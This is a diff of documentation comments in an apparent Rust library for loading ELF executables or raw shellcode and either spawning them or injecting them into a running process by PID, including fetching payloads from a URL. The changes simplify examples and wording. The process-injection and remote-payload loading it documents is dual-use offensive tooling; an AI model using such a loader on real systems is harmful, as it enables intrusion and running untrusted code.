@@ -80,15 +80,12 @@ pub enum PayloadType {
 
 // Constructors
 impl Payload<Spawn> {
-    /// Creates a Spawn payload from a byte vector.
+    /// Creates a spawned payload from raw bytes.
     ///
-    /// The bytes can represent either a complete ELF executable or raw shellcode, as specified by
-    /// the `payload_type` parameter.
+    /// The bytes can represent either a complete ELF executable or raw shellcode.
     ///
     /// # Parameters
-    ///
-    /// * `bytes` - The raw bytes of the payload
-    /// * `payload_type` - Specifies whether these bytes represent an executable or shellcode
+    /// * `bytes` - The raw bytes representing shellcode or an executable
     ///
     /// # Errors
     /// Currently infallible, but returns `Result` for consistency with other constructors.
@@ -96,11 +93,10 @@ impl Payload<Spawn> {
     /// # Examples
     ///
     /// ```
-    /// use linc::payload::{Spawn, Payload, PayloadType};
+    /// use linc::payload::{Payload, Spawn};
     ///
-    /// // Create a payload from shellcode bytes
-    /// let shellcode = vec![0x90, 0x90, 0x90];  // NOP sled
-    /// let payload = Payload::<Spawn>::from_bytes(shellcode, PayloadType::Shellcode).unwrap();
+    /// let bytes = vec![/* bytes */];
+    /// let payload = Payload::<Spawn>::from_bytes(bytes).unwrap();
     /// ```
     pub fn from_bytes(bytes: Vec<u8>) -> Result<Self> {
         let payload_type = match bytes[..4] {
@@ -120,31 +116,25 @@ impl Payload<Spawn> {
         })
     }
 
-    /// Creates a Spawn payload by reading from a file.
+    /// Creates a spawned payload from a file.
     ///
-    /// The file can contain either a complete ELF executable or raw shellcode, as specified by
-    /// the `payload_type` parameter.
+    /// The file can contain either a complete ELF executable or raw shellcode.
     ///
     /// # Parameters
-    ///
-    /// * `path` - Path to the file containing the payload
-    /// * `payload_type` - Specifies whether the file contains an executable or shellcode
+    /// * `path` - Path to the file containing shellcode or an executable.
     ///
     /// # Errors
     /// Returns an error if:
-    /// - The file cannot be read
-    /// - The file path contains invalid UTF-8 characters
+    /// - The file cannot be read.
+    /// - The file path contains invalid UTF-8 characters.
     ///
     /// # Examples
     ///
     /// ```no_run
-    /// use linc::payload::{Spawn, Payload, PayloadType};
+    /// use linc::payload::{Payload, Spawn};
     ///
-    /// // Load a shellcode file
-    /// let payload = Payload::<Spawn>::from_file("shellcode.bin", PayloadType::Shellcode).unwrap();
-    ///
-    /// // Load an Inject ELF executable
-    /// let payload = Payload::<Spawn>::from_file("/usr/bin/ls", PayloadType::Executable).unwrap();
+    /// // Load a payload from a file
+    /// let payload = Payload::<Spawn>::from_file("/path/to/payload").unwrap();
     /// ```
     pub fn from_file(path: impl Into<String>) -> Result<Self> {
         let path = path.into();
@@ -168,38 +158,25 @@ impl Payload<Spawn> {
     }
 
     #[cfg(feature = "http")]
-    /// Creates a Spawn payload by downloading from a URL.
+    /// Creates a spawned payload by downloading from a URL.
     ///
-    /// The downloaded content can be either a complete ELF executable or raw shellcode, as specified by
-    /// the `payload_type` parameter.
+    /// The downloaded file can be either a complete ELF executable or raw shellcode.
     ///
     /// # Parameters
     ///
-    /// * `url` - URL to download the payload from
-    /// * `payload_type` - Specifies whether the download contains an executable or shellcode
+    /// * `url` - URL to download the payload from.
     ///
     /// # Errors
     /// Returns an error if:
-    /// - The URL is invalid or unreachable
-    /// - The network request fails
-    /// - Reading the response body fails
+    /// - The URL is invalid or unreachable.
+    /// - The network request fails.
+    /// - Reading the response body fails.
     ///
     /// # Examples
-    ///
     /// ```no_run
-    /// use linc::payload::{Spawn, Payload, PayloadType};
+    /// use linc::payload::{Payload, Spawn};
     ///
-    /// // Download and load an ELF executable
-    /// let payload = Payload::<Spawn>::from_url(
-    ///     "http://example.com/executable",
-    ///     PayloadType::Executable
-    /// ).unwrap();
-    ///
-    /// // Download and load shellcode
-    /// let payload = Payload::<Spawn>::from_url(
-    ///     "http://example.com/shellcode.bin",
-    ///     PayloadType::Shellcode
-    /// ).unwrap();
+    /// let payload = Payload::<Spawn>::from_url("https://example.com/payload").unwrap();
     /// ```
     pub fn from_url(url: impl Into<String>) -> Result<Self> {
         let url = url.into();
@@ -228,24 +205,19 @@ impl Payload<Spawn> {
 }
 
 impl Payload<Inject> {
-    /// Creates a Spawn payload for injection into an Inject process.
+    /// Creates an injected payload from raw bytes.
     ///
     /// # Parameters
-    ///
-    /// * `bytes` - The raw bytes of the payload
-    /// * `payload_type` - Specifies whether these bytes represent an executable or shellcode
+    /// * `bytes` - The raw bytes representing shellcode or an executable
     /// * `pid` - Process ID of the target process
     ///
     /// # Examples
-    ///
     /// ```no_run
-    /// use linc::payload::{Inject, Payload, PayloadType};
+    /// use linc::payload::{Inject, Payload};
     ///
-    /// let payload = Payload::<Inject>::from_bytes(
-    ///     vec![0x90, 0x90, 0x90],
-    ///     PayloadType::Shellcode,
-    ///     1234
-    /// ).unwrap();
+    /// let bytes = vec![/* bytes */];
+    /// // Inject payload into a process with PID 1234
+    /// let payload = Payload::<Inject>::from_bytes(bytes, 1234).unwrap();
     /// ```
     pub fn from_bytes(bytes: Vec<u8>, pid: i32) -> Result<Self> {
         let payload_type = match bytes[..4] {
@@ -262,32 +234,23 @@ impl Payload<Inject> {
         })
     }
 
-    /// Creates a Spawn payload by reading from a file.
-    ///
-    /// The file can contain either a complete ELF executable or raw shellcode, as specified by
-    /// the `payload_type` parameter.
+    /// Creates an injected payload by reading from a file.
     ///
     /// # Parameters
-    ///
-    /// * `path` - Path to the file containing the payload
-    /// * `payload_type` - Specifies whether the file contains an executable or shellcode
+    /// * `path` - Path to the file containing shellcode or an executable
     /// * `pid` - Process ID of the target process
     ///
     /// # Errors
     /// Returns an error if:
-    /// - The file cannot be read
-    /// - The file path contains invalid UTF-8 characters
+    /// - The file cannot be read.
+    /// - The file path contains invalid UTF-8 characters.
     ///
     /// # Examples
-    ///
     /// ```no_run
-    /// use linc::payload::{Inject, Payload, PayloadType};
+    /// use linc::payload::{Inject, Payload};
     ///
-    /// let payload = Payload::<Inject>::from_file(
-    ///     "shellcode.bin",
-    ///     PayloadType::Shellcode,
-    ///     1234
-    /// ).unwrap();
+    /// // Inject payload into a process with PID 1234
+    /// let payload = Payload::<Inject>::from_file("/path/to/payload", 1234).unwrap();
     /// ```
     pub fn from_file(path: impl Into<String>, pid: i32) -> Result<Self> {
         let path = path.into();
@@ -325,15 +288,11 @@ impl Payload<Inject> {
     /// - Reading the response body fails
     ///
     /// # Examples
-    ///
     /// ```no_run
-    /// use linc::payload::{Inject, Payload, PayloadType};
+    /// use linc::payload::{Inject, Payload};
     ///
-    /// let payload = Payload::<Inject>::from_url(
-    ///     "http://example.com/shellcode.bin",
-    ///     PayloadType::Shellcode,
-    ///     1234
-    /// ).unwrap();
+    /// // Inject payload into a process with PID 1234
+    /// let payload = Payload::<Inject>::from_url("http://example.com/payload", 1234).unwrap();
     /// ```
     #[cfg(feature = "http")]
     pub fn from_url(url: impl Into<String>, pid: i32) -> Result<Self> {
